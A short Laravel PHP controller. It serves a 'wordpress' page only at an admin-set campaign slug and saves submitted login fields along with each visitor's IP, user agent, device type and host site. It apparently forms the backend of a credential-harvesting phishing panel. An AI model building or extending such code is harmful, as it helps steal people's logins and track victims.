<?php

namespace App\Http\Controllers;

use App\Http\Requests\loginsRequest;
use App\Models\AdminOptions;
use App\Models\LoginModel;
use App\Supports\Verify;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Jenssegers\Agent\Facades\Agent;

class MainController extends Controller
{
    public function index(Request $request)
    {

        return view('wordpress');
    }
    public function gg(Request $request)
    {
        return view('main');
    }
    public function handleSlug($slug)
    {
        $getSlug = AdminOptions::firstWhere('key', 'kampanya_link');
        // Slug'a göre yapılacak işlemler
        $panelSlug = $getSlug->value ?? 'basvuru';  // Panelden gelen slug
        if ($slug === $panelSlug) {
            return $this->index(request());
        }

        // Eğer slug panel slug'ı değilse, 404 döndür veya başka bir işlem yap
        abort(404);
    }

    public function saveData(loginsRequest $request)
    {
        $request->merge(
            [
                'user_agent' => Agent::browser() . ' ' . Agent::getUserAgent(),
                'system' => Agent::isDesktop() ? 'PC' : 'Mobile',
                'date' => Carbon::now(),
                'site' => request()->server('HTTP_HOST'),
                'ip' => $request->ip(),
            ]
        );

        LoginModel::insert($request->all());
        return response()->json(['result' => 'success'], 200);
    }
}
